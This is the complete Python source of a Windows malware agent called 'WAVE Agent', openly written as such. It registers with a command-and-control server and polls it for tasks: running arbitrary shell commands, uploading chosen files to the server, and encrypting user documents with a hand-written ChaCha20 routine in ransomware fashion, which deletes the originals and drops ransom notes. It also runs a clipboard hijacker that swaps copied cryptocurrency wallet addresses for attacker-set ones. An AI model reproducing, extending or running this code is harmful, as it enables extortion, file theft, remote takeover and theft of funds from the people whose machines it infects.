# -*- coding: utf-8 -*-
# WAVE Agent (Windows)
import os, sys, json, time, base64, ctypes, re, threading, subprocess, platform
from urllib import request as urlrequest

C2 = os.environ.get('WAVE_C2', 'http://127.0.0.1:5000')
AGENT_ID = None
VERSION = '1.1'

# ---- ChaCha20 (pure Python) ----
def _rotl32(x, n):
    return ((x << n) & 0xffffffff) | (x >> (32 - n))

def _quarter_round(a, b, c, d):
    a = (a + b) & 0xffffffff; d ^= a; d = _rotl32(d, 16)
    c = (c + d) & 0xffffffff; b ^= c; b = _rotl32(b, 12)
    a = (a + b) & 0xffffffff; d ^= a; d = _rotl32(d, 8)
    c = (c + d) & 0xffffffff; b ^= c; b = _rotl32(b, 7)
    return a, b, c, d

def chacha20_block(key, counter, nonce):
    constants = b'expand 32-byte k'
    def u32(b): return int.from_bytes(b, 'little')
    st = [u32(constants[0:4]), u32(constants[4:8]), u32(constants[8:12]), u32(constants[12:16])]
    st += [u32(key[i:i+4]) for i in range(0, 32, 4)]
    st += [counter] + [u32(nonce[i:i+4]) for i in range(0, 12, 4)]
    working = st.copy()
    for _ in range(10):
        working[0], working[4], working[8], working[12] = _quarter_round(working[0], working[4], working[8], working[12])
        working[1], working[5], working[9], working[13] = _quarter_round(working[1], working[5], working[9], working[13])
        working[2], working[6], working[10], working[14] = _quarter_round(working[2], working[6], working[10], working[14])
        working[3], working[7], working[11], working[15] = _quarter_round(working[3], working[7], working[11], working[15])
        working[0], working[5], working[10], working[15] = _quarter_round(working[0], working[5], working[10], working[15])
        working[1], working[6], working[11], working[12] = _quarter_round(working[1], working[6], working[11], working[12])
        working[2], working[7], working[8], working[13] = _quarter_round(working[2], working[7], working[8], working[13])
        working[3], working[4], working[9], working[14] = _quarter_round(working[3], working[4], working[9], working[14])
    out = [(working[i] + st[i]) & 0xffffffff for i in range(16)]
    return b''.join(x.to_bytes(4, 'little') for x in out)

def chacha20_xor(key, nonce, initial_counter, data):
    out = bytearray()
    counter = initial_counter
    for i in range(0, len(data), 64):
        block = chacha20_block(key, counter, nonce)
        chunk = data[i:i+64]
        out.extend(bytes(a ^ b for a, b in zip(chunk, block[:len(chunk)])))
        counter = (counter + 1) & 0xffffffff
    return bytes(out)

# ---- Clipboard hijacker using WinAPI ----
CF_UNICODETEXT = 13
GMEM_MOVEABLE = 0x0002
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class ClipHijacker(threading.Thread):
    def __init__(self, mapping, enable=True):
        super().__init__(daemon=True)
        self.mapping = mapping
        self.enable = enable
        self.stop_flag = False
        self._last = None
    def run(self):
        while not self.stop_flag:
            try:
                if self.enable:
                    txt = self.get_clip_text()
                    if txt and txt != self._last:
                        new = self.rewrite_wallets(txt)
                        if new != txt:
                            self.set_clip_text(new)
                        self._last = new
                time.sleep(0.35)
            except Exception:
                time.sleep(0.5)
    def get_clip_text(self):
        if user32.OpenClipboard(0):
            text = None
            try:
                h = user32.GetClipboardData(CF_UNICODETEXT)
                if h:
                    p = kernel32.GlobalLock(h)
                    if p:
                        try:
                            text = ctypes.wstring_at(p)
                        finally:
                            kernel32.GlobalUnlock(h)
            finally:
                user32.CloseClipboard()
            return text
        return None
    def set_clip_text(self, text):
        if not isinstance(text, str):
            return
        if user32.OpenClipboard(0):
            try:
                user32.EmptyClipboard()
                size = (len(text)+1)*2
                h = kernel32.GlobalAlloc(GMEM_MOVEABLE, size)
                p = kernel32.GlobalLock(h)
                ctypes.memmove(p, ctypes.create_unicode_buffer(text), size)
                kernel32.GlobalUnlock(h)
                user32.SetClipboardData(CF_UNICODETEXT, h)
            finally:
                user32.CloseClipboard()
    def rewrite_wallets(self, s):
        patterns = {
            'btc': re.compile(r'(?:bc1[0-9a-z]{25,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})'),
            'eth': re.compile(r'0x[a-fA-F0-9]{40}'),
            'xmr': re.compile(r'4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}'),
            'sol': re.compile(r'[1-9A-HJ-NP-Za-km-z]{32,44}'),
            'trx': re.compile(r'T[1-9A-HJ-NP-Za-km-z]{33}'),
            'ltc': re.compile(r'(?:ltc1[0-9a-z]{25,87}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,33})'),
            'doge': re.compile(r'D[5-9A-HJ-NP-Za-km-z]{33}'),
            'xrp': re.compile(r'r[1-9A-HJ-NP-Za-km-z]{24,34}'),
            'xlm': re.compile(r'G[A-Z2-7]{55}'),
            'ada': re.compile(r'(?:addr1[0-9a-z]{58,})')
        }
        for k, patt in patterns.items():
            repl = self.mapping.get(k, '')
            if repl:
                s = patt.sub(repl, s)
        return s

# ---- Agent core ----

def http_json(url, payload):
    data = json.dumps(payload).encode()
    req = urlrequest.Request(url, data=data, headers={'Content-Type': 'application/json'})
    with urlrequest.urlopen(req, timeout=15) as r:
        return json.loads(r.read().decode())

def http_post_file(url, fields, filepath):
    boundary = '----WebKitFormBoundary' + base64.b64encode(os.urandom(6)).decode()
    def part(name, value):
        return (f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n').encode()
    body = b''
    for k, v in fields.items():
        body += part(k, v)
    filename = os.path.basename(filepath)
    body += (f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\n'
             'Content-Type: application/octet-stream\r\n\r\n').encode()
    body += open(filepath, 'rb').read()
    body += f'\r\n--{boundary}--\r\n'.encode()
    req = urlrequest.Request(url, data=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
    with urlrequest.urlopen(req, timeout=30) as r:
        return r.read().decode()

def do_exec(cmd):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out = p.communicate()[0]
        return out
    except Exception as e:
        return str(e).encode()

# ransomware using ChaCha20

def ransom_dirs(dirs, ransom_ext, note_text):
    key = os.urandom(32)
    manifest = []
    targets = []
    exts = set(['.txt','.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.jpg','.jpeg','.png','.csv','.sql','.db','.zip','.7z','.rar','.psd','.json','.xml'])
    for d in dirs:
        d = os.path.expandvars(d)
        for root,_,files in os.walk(d):
            for f in files:
                p = os.path.join(root, f)
                if os.path.splitext(p)[1].lower() in exts:
                    targets.append(p)
    for p in targets:
        try:
            nonce = os.urandom(12)
            data = open(p,'rb').read()
            enc = chacha20_xor(key, nonce, 1, data)
            newpath = p + ransom_ext
            with open(newpath,'wb') as w: w.write(enc)
            os.remove(p)
            manifest.append({'path': p, 'nonce': base64.b64encode(nonce).decode(), 'size': len(data)})
        except Exception:
            continue
    # drop ransom notes
    dirs_unique = set(os.path.dirname(p) for p in targets)
    for d in dirs_unique:
        try:
            with open(os.path.join(d, 'WAVE-README.txt'), 'w', encoding='utf-8') as w:
                w.write(note_text)
        except Exception:
            pass
    return key, manifest


def agent_loop():
    global AGENT_ID
    info = {
        'hostname': platform.node(),
        'username': os.getenv('USERNAME') or os.getenv('USER'),
        'os': platform.platform(),
        'version': VERSION
    }
    cfg = http_json(C2 + '/api/register', info)
    AGENT_ID = cfg['id']
    settings = cfg.get('settings', {})
    mapping = {
        'btc': settings.get('btc_address',''),
        'eth': settings.get('eth_address',''),
        'xmr': settings.get('xmr_address',''),
        'sol': settings.get('sol_address',''),
        'trx': settings.get('trx_address',''),
        'ltc': settings.get('ltc_address',''),
        'doge': settings.get('doge_address',''),
        'xrp': settings.get('xrp_address',''),
        'xlm': settings.get('xlm_address',''),
        'ada': settings.get('ada_address','')
    }
    clip = ClipHijacker(mapping, enable=(settings.get('clip_hijack_enable','true')=='true'))
    try:
        clip.start()
    except Exception:
        pass
    while True:
        try:
            tasks = http_json(C2 + '/api/poll', {'id': AGENT_ID}).get('tasks', [])
            for t in tasks:
                ttype = t['type']; args = t.get('args', {})
                status = 'done'; result = b''
                if ttype == 'exec':
                    result = do_exec(args.get('cmd','whoami'))
                elif ttype == 'exfil':
                    path = args.get('path');
                    if path and os.path.exists(path):
                        try:
                            http_post_file(C2 + f'/api/upload?id={AGENT_ID}&path={path}', {}, path)
                            result = f'uploaded {path}'.encode()
                        except Exception as e:
                            result = str(e).encode()
                    else:
                        result = b'not found'
                elif ttype == 'ransom':
                    dirs = args.get('dirs') or [os.path.expanduser('~')]
                    ext = args.get('ext') or settings.get('ransom_extension','.wave')
                    note = settings.get('ransom_note','').format(btc=mapping['btc'], eth=mapping['eth'], xmr=mapping['xmr'], agent_id=AGENT_ID)
                    key, manifest = ransom_dirs(dirs, ext, note)
                    blob = json.dumps({'key': base64.b64encode(key).decode(), 'manifest': manifest}).encode()
                    result = blob
                elif ttype == 'clipjacker':
                    if 'enable' in args:
                        clip.enable = bool(args['enable'])
                    for k in ['btc','eth','xmr','sol','trx','ltc','doge','xrp','xlm','ada']:
                        if k in args:
                            clip.mapping[k] = args[k]
                    result = json.dumps({'enable': clip.enable, 'mapping': clip.mapping}).encode()
                else:
                    status = 'unknown'
                    result = b''
                http_json(C2 + '/api/result', {
                    'task_id': t['id'], 'status': status,
                    'result': base64.b64encode(result).decode()
                })
        except Exception:
            time.sleep(2.0)
        time.sleep(1.0)

if __name__ == '__main__':
    try:
        agent_loop()
    except Exception:
        pass
